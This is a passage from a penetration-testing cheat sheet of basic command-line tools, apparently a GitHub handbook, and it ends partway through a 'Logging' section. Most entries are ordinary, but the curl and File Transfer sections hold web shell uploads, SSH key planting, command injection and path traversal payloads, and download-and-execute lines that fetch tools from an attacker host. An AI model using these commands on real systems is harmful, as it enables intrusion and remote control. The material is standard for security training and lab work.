# Basics

## Table of Contents

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Resources)
- [7z](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#7z)
- [adb (Andoid Debug Bridge)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#adb-Andoid-Debug-Bridge)
- [ar](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#ar)
- [ash](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#ash)
- [ack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#ack)
- [ASCII](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#ASCII)
- [awk](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#awk)
- [Bash](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Bash)
- [Bash POSIX](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Bash-POSIX)
- [BIND](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#BIND)
- [cadaver](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#cadaver)
- [certutil](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#certutil)
- [changelist](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#changelist)
- [Chisel](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Chisel)
- [chmod](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#chmod)
- [gcc](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#gcc)
- [Copy Files (Bash only)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Copy-Files-Bash-only)
- [Core Dump](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Core-Dump)
- [curl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#curl)
- [dig](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#dig)
- [dos2unix](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#dos2unix)
- [dpkg](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#dpkg)
- [echo](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#echo)
- [egrep](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#egrep)
- [faketime](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#faketime)
- [fg](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#fg)
- [file](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#file)
- [File Transfer](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#File-Transfer)
- [find](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#find)
- [for loop](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#for-loop)
- [FTP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#FTP)
- [getent](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#getent)
- [getfacl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#getfacl)
- [Git](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Git)
- [Go](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Go)
- [grep](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#egrep)
- [grpc](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#grpc)
- [host](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#host)
- [icacls](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#icacls)
- [IPython](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#IPython)
- [Java](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Java)
- [Kerberos](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Kerberos)
- [ldd](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#ldd)
- [less](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#less)
- [lftp](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#lftp)
- [Linux](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Linux)
- [Logfiles](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Logfiles)
- [Logging](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Logging)
- [Microsoft Windows](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Microsoft-Windows)
- [mp64](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#mp64)
- [msg](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#msg)
- [nc / Ncat / netcat](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#nc--Ncat--netcat)
- [NetworkManager](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#NetworkManager)
- [nfsshell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#nfsshell)
- [npx](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#npx)
- [objectdump](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#objectdump)
- [OpenBSD](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#OpenBSD)
- [Outlook](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Outlook)
- [paste](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#paste)
- [Perl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Perl)
- [PHP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#PHP)
- [PNG](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#PNG)
- [PowerShell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#PowerShell)
- [proc](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#proc)
- [proftp](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#proftp)
- [Python2](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Python2)
- [Python](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Python)
- [Python TOTP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Python-TOTP)
- [RDP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#RDP)
- [readpst](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#readpst)
- [regedit](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#regedit)
- [rev](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#rev)
- [rlwrap](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#rlwrap)
- [rpm2cpio](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#rpm2cpio)
- [rsh](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#rsh)
- [rsync](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#rsync)
- [sendemail](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#sendemail)
- [seq](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#seq)
- [SetUID Bit](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#SetUID-Bit)
- [sftp](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#sftp)
- [showmount](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#showmount)
- [simpleproxy](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#simpleproxy)
- [SMB](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#SMB)
- [smbclient](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#smbclient)
- [smbget](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#smbget)
- [smbmap](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#smbmap)
- [smbpasswd](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#smbpasswd)
- [socat](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#socat)
- [Spaces Cleanup](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Spaces-Cleanup)
- [squid](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#squid)
- [squidclient](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#squidclient)
- [SSH](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#SSH)
- [stat](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#stat)
- [stty](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#stty)
- [strings](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#strings)
- [SVN](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#SVN)
- [swaks](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#swaks)
- [systemd](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#systemd)
- [tee](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#tee)
- [tftp](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#tftp)
- [timedatectl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#timedatectl)
- [Time and Date](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Time-and-Date)
- [tmux](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#tmux)
- [TTL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#TTL)
- [utf8cleaner](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#utf8cleaner)
- [VDH](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#VDH)
- [vim](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#vim)
- [VirtualBox](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#VirtualBox)
- [virtualenv](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#virtualenv)
- [wget](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#wget)
- [while loop](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#while-loop)
- [Writeable Directories](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Writeable-Directories)
- [Windows Subsystem for Linux (WSL)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Windows-Subsystem-for-Linux-WSL)
- [xfreerdp](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#xfreerdp)
- [Zip](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Zip)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Chisel | A fast TCP/UDP tunnel over HTTP | https://github.com/jpillora/chisel |
| Swaks | Swiss Army Knife for SMTP | https://github.com/jetmore/swaks |
| MailHog | Web and API based SMTP testing | https://github.com/mailhog/MailHog |
| up-http-tool | Simple HTTP listener for security testing | https://github.com/MuirlandOracle/up-http-tool |
| CyberChef | The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis. | https://gchq.github.io/CyberChef |
| searchcode | Search 75 billion lines of code from 40 million projects | https://searchcode.com |

## 7z

### List Files in Archive and Technical Information

```c
$ 7z l -slt <FILE>
```

### Extract Archive

```c
$ 7z x <FILE>
```

## adb (Andoid Debug Bridge)

```c
$ adb connect <RHOST>:5555
$ adb shell
$ adb devices
$ adb install <file>.apk
```

### Set Proxy

```c
$ adb shell settings put global http_proxy <LHOST>:<LPORT>
```

## ar

### Unpacking .deb Files

```c
$ ar x <FILE>.deb
```

## ash

### Interactive Shell sdterr to sdtout

```c
$ ash -i 2>&1
```

## ack

```c
$ ack -i '<STRING>'    // like password
```

## ASCII

```c
$ man ascii
```

## awk

### Use . as Seperator

```c
$ awk -F. '{print $1}' <FILE>
```

### Field Seperator is ":" and it prints the output from Row 3

```c
$ awk -F':' '{print $3}'
```

### Print Line Number 1 and 42

```c
$ awk 'NR==1 || NR==42'
```

```c
$ awk '{print "http://<LHOST>/documents/" $0;}' ../files.txt | xargs -n 1 -P 16 wget  -q -P /PATH/TO/FOLDER/
```

## Bash

### Execute Privilege

```c
$ bash -p
```

### Bash Scripting

#### Create Files with Date in the Name

```c
for year in {2019..2021}; do
  for month in {01..12}; do
    for day in {01..31}; do
      echo "$year-$month-$day-upload.pdf" >> dates.txt
    done
  done
done
```

## Bash POSIX

```c
$ sls -b '
> bash -p'
bash-4.3$
```

## BIND

### Update Records using BIND Console

```c
$ nsupdate -k /etc/bind/infra.key
update add foobar.infra.dyna.htb 86400 A 10.10.14.135

update add 135.14.10.10.in-addr.arpa 86400 PTR foobar.<TARGET_DOMAIN>
show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
135.14.10.10.in-addr.arpa. 86400 IN     PTR     foobar.<TARGET_DOMAIN>.

send
quit
```

## cadaver

### Accessing WebDAV

```c
$ cadaver http://<RHOST>/webdav
```

## certutil

### Copy Files

```c
$ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

## changelist

### BSD

```c
$ cat /etc/changelist
```

## Chisel

> https://github.com/jpillora/chisel

### Reverse Pivot

#### Server

```c
$ ./chisel server -p 9002 -reverse -v
```

#### Client

```c
$ ./chisel client <RHOST>:9002 R:9003:127.0.0.1:8888
```

### SOCKS5 / Proxychains Configuration

#### Server

```c
$ ./chisel server -p 9002 -reverse -v
```

#### Client

```c
$ ./chisel client <RHOST>:9002 R:socks
```

## chmod

### SUID Bit

```c
$ chmod +s <FILE>
```

## gcc

```c
$ gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
```

### Linux

```c
$ gcc -m32|-m64 -o output source.c
```

### Windows

```c
$ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
```

## Copy Files (Bash only)

### wget Version

Paste directly to the Shell.

```c
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

#### Usage

```c
__wget http://<LHOST>/<FILE>
```

### curl Version

```c
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

### Usage

```c
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

## Core Dump

### Generate Core Dump

```c
$ kill -BUS <PROCESS_ID>
```

### Extract Core Dump

```c
$ apport-unpack /var/crash/_<PATH/TO/CRASHED/PROCESS>_<PROCESS>.1000.crash /PATH/TO/FOLDER/
```

## curl

```c
$ curl -v http://<TARGET_DOMAIN>
$ curl -X POST http://<TARGET_DOMAIN>
$ curl -I POST http://<TARGET_DOMAIN>
$ curl -X PUT http://<TARGET_DOMAIN>
$ curl --path-as-is http://<TARGET_DOMAIN>/../../../../../../etc/passwd
$ curl -s "http://<TARGET_DOMAIN>/reports.php?report=2589" | grep Do -A8 | html2text
```

### Headers

```c
$ curl -vvv <RHOST>
```

or

```c
$ curl -s -q -v -H 'Origin: http://<RHOST>' <TARGET_DOMAIN>/api/auth
```

### Use SSL

```c
$ curl -k <RHOST>
```

### Use Proxy

```c
$ curl --proxy http://127.0.0.1:8080
```

### Web Shell Upload

```c
$ curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://<RHOST>/PATH/TO/DIRECTORY/<FILE>.php
$ curl -X PUT -T /usr/share/webshells/aspx/cmdasp.aspx "http://<RHOST>/sh.aspx"
$ curl -X MOVE -H "Destination: http://<RHOST>/sh.aspx" http://<RHOST>/sh.txt
```

### SSH Key Upload

```c
$ curl -G 'http://<RHOST>/<WEBSHELL>.php' --data-urlencode 'cmd=echo ssh-rsa AAAA--- snip --- 5syQ > /home/<USERNAME>/.ssh/authorized_keys'
```

### Command Injection

```c
$ curl -X POST http://<RHOST>/select --data 'db=whatever|id'
```

### File upload from local Web Server to Remote System

```c
$ curl http://<LHOST>/nc.exe -o c:\users\<USER>\nc.exe
```

### File Download via Command Injection

```c
$ curl --silent -X POST http://<RHOST>/select --data 'db=whatever|cat /home/bob/ca/intermediate/certs/intermediate.cert.pem' | grep -zo '\-\-.*\-\-' > intermediate.cert.pem
```

### Get Server Time

```c
$ curl --head http://<RHOST>/
```

### curl Injection with Burp Suite

```c
-o /var/www/html/uploads/shell.php http://<LHOST>/shell.php
```

## dig

### Banner Grabbing

```c
$ dig version.bind CHAOS TXT @<RHOST>
$ dig ANY @<RHOST> <TARGET_DOMAIN>
$ dig A @<RHOST> <TARGET_DOMAIN>
$ dig AAAA @<RHOST> <TARGET_DOMAIN>
$ dig TXT @<RHOST> <TARGET_DOMAIN>
$ dig MX @<RHOST> <TARGET_DOMAIN>
$ dig NS @<RHOST> <TARGET_DOMAIN>
$ dig -x <RHOST> @<RHOST>
```

### Zone Transfer

```c
$ dig axfr @<RHOST>
$ dig axfr @<RHOST> <TARGET_DOMAIN>
```

### Dir

```c
C:\> dir flag* /s /p
C:\> dir /s /b *.log
```

## dos2unix

```c
$ dos2unix <FILE>.sh
```

## dpkg

### Files which changed in the last 2 Minutes

```c
$ dpkg -V 2>/dev/null
```

## echo

### Remove "\n"

```c
$ echo -e "string\n" > <FILE>
```

## egrep

### Search for IPv6 Addresses

```c
$ egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'
```

## Environment Variables

```c
$ env
$ echo $PATH
```

### Export Path

```c
$ echo $PATH
$ export PATH=`pwd`:$PATH
```

## faketime

```c
$ faketime 'last friday 5 pm' /bin/date
$ faketime '2008-12-24 08:15:42' /bin/date
$ faketime -f '+2,5y x10,0' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
$ faketime -f '+2,5y x0,50' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
$ faketime -f '+2,5y i2,0' /bin/bash -c 'date; while true; do date; sleep 1 ; done'
```

### Proxychains and Kerberos

```c
$ proxychains faketime -f +1h kinit -V -X X509_user_identity=FILE:admin.cer,admin.key administrator@WINDCORP.HTB
```

## fg

```c
$ fg
```

## file

```c
$ file <file>
```

## File Transfer

### SMB Access via PowerShell

```c
$ sudo python3 impacket/examples/smbserver.py <SHARE> ./
```

or

```c
$ sudo impacket-smbserver <SHARE> . -smb2support
```

### Linux to Windows

```c
PS C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/<LOCAL_DIRECTORY>/<FILE>','C:\Users\<USERNAME>\Documents\<FILE>')"
```

### Windows to Linux

```c
C:\> copy * \\<LHOST>\<SHARE>
```

### Windows to Linux using Invoke-Webrequest

```c
PS C:\> powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

#### Short Version

```c
PS C:\> IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing)
```

### FTP Server

```c
$ sudo msfconsole
msf6 > use auxiliary/server/ftp
msf6 auxiliary(server/ftp) > set FTPROOT /home/kali/htb/machines/sauna/serve/
FTPROOT => /home/kali/htb/machines/sauna/serve/
msf6 auxiliary(server/ftp) > exploit
[*] Auxiliary module running as background job 0.
```

## find

```c
$ find . -type f
```

### Line Count

```c
$ find . -type f -exec wc -l {} \; | sort -nr
```

### Find not empty Files

```c
$ find results -not -empty -ls
```

### Show Permissions

```c
$ find . -type d -ls
```

## for loop

```c
$ for i in $(seq 0 30); do ssh -i ~/.ssh/id_rsa root@<RHOST>; sleep 1; done
```

### Generate simple List

```c
$ for i in `seq 1 100`; do echo $i; done
```

## FTP

```c
$ ftp <RHOST>
```

### Usage

```c
ftp
>anonymous
>anonymous
>ls -a    // list all files (even hidden) (yes, they could be hidden)
>binary   // set transmission to binary instead of ascii
>ascii    // set transmission to ascii instead of binary
>bye      // exit
```

### Example

```c
$ ftp -p <RHOST>    // passive mode for firewall evasion
```

### Scan for detailed Output

```c
$ nmap -sC -sV -p 21 -vvv <RHOST>
```

### Browser Connection

```c
$ ftp://anonymous:anonymous@<RHOST>
```

### Download all files from FTP

```c
$ wget -m ftp://anonymous:anonymous@<RHOST>    // Download all
$ wget -m --no-passive ftp://anonymous:anonymous@<RHOST>    // Download all
```

## getent

```c
$ getent passwd
```

## getfacl

### Read ACL Permissions

```c
$ getfacl <LOCAL_DIRECTORY>
```

## Git

```c
$ git show-branch
$ git log <BRANCH> --oneline
$ git show <COMMIT>
```

## Go

### Setting Environment Variables

```c
$ export PATH=$PATH:/usr/local/go/bin
$ export GO111MODULE=on
```

## grep

```c
$ grep -v                        // remove string from output
$ grep -Hnri <FILE> * | vim -    // pipe output into a new vim buffer
$ grep "$_" * | grep -v "_SERVER\|_SESSION"    // \| equals "or" in grep
```

```c
$ grep -oP '<UNWANTED>\K<OUTPUT-THIS>(?=UNWANTED)'
```

or

```c
$ grep -oP '".*php"'
```

#### Explanation

* -P matching Perl-compatible regular expressions (PCREs)
* -o only output the match, not entire line
* \K ignore everything on left from here
* (?=) ignore everything in here

#### Example

```c
echo 'aaaaabbbbbccccc' | grep -Po 'a+\Kb+(?=c+)'
bbbbb
```

### Search for IPv4 Addresses

```c
$ grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
```

### Extended Seach

```c
$ grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b|<search_parameter_2>"
```

### Enumerate JavaScript Files

```c
$ curl http://<TARGET_DOMAIN>/js/chunk-vendors~03631906.67e21e66.js | grep -oP '/api/[^"]*'
```

## grpc

```c
$ pip3 install grpc
$ pip3 install grpc-tools
```

### Skeleton File Structure

```c
syntax = "proto3";

message Content {
	    string data = 1;
}

message Data {
	    string feed = 1;
}

service Print {
	    rpc Feed(Content) return (Data) {}
}

$ python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. file.proto
```

## host

```c
$ host <RHOST>
$ host <TARGET_DOMAIN>
$ host -l <TARGET_DOMAIN> <RHOST>
```

## icacls

```c
$ icacls <FILE>
```

## IPython

> https://ipython.org/

```c
$ ipython3
```

## Java

### Compiling java.class

```c
$ javac <FILE>.java
$ javac -d . <FILE>.java
```

## Kerberos

### Ticket Handling with krb5

```c
/etc/krb5.conf                   // kerberos configuration file location
kinit <USERNAME>                 // creating ticket request
klist                            // show available kerberos tickets
kdestroy                         // delete cached kerberos tickets
.k5login                         // resides kerberos principals for login (place in home directory)
krb5.keytab                      // "key table" file for one or more principals
kadmin                           // kerberos administration console
add_principal <EMAIL>            // add a new user to a keytab file
ksu                              // executes a command with kerberos authentication
klist -k /etc/krb5.keytab        // lists keytab file
kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
```

### Debug

```c
KRB5_TRACE=/dev/stdout kinit -X X509_user_identity=FILE:admin.cer,admin.key Administrator@<DOMAIN>
```

## ldd

```c
$ ldd /bin/ls
```

## less

### Disable Line Wrapping

```c
$ | less -s
```

## lftp

```c
$ lftp <RHOST> 21
$ set ftp:ssl-force true
$ set ssl:verify-certificate no
$ user <USERNAME>
$ ls
```

## Linux

### User Management

#### Change Username

```c
$ passwd root
$ reboot
```

##### Login as root

```c
$ usermod -l <NEW_USERNAME> -d /home/<NEW_USERNAME> -m <OLD_USERNAME>
$ groupmod -n <NEW_USERNAME> <OLD_USERNAME>
$ ln -s /home/<NEW_USERNAME> /home/<OLDUSERNAME>
```

##### Optional: Change Display Name

```c
$ chfn -f "GIVENNAME SURNAME" <NEW_USERNAME>
```

### System Commands

```c
$ last -a
$ cat /etc/issue
$ cat /etc/*release*
$ cat /proc/version
$ sudo -l    // sudo possibilities
```

### Network Commands

```c
$ watch ss -tp
$ netstat -ant
$ netstat -tulpn
$ lsof -i
$ ss -tupn
$ ss -tulpn
$ ping -c 1 <RHOST>
```

### Processes

```c
$ ps -auxf
```

or

```c
$ ps -eaf
$ ss -anp <PROCESS_ID>
$ cd /proc/<PROCESS_ID>
$ ls -la | grep cwd
```

## Logfiles

### Check for User Activity

```c
$ cd /var/log/apache2
$ grep <RHOST> access.log
```

## Logging

Add them to either the `.bashrc` or to the `.zshrc`.

### Bash: local IP address

```c
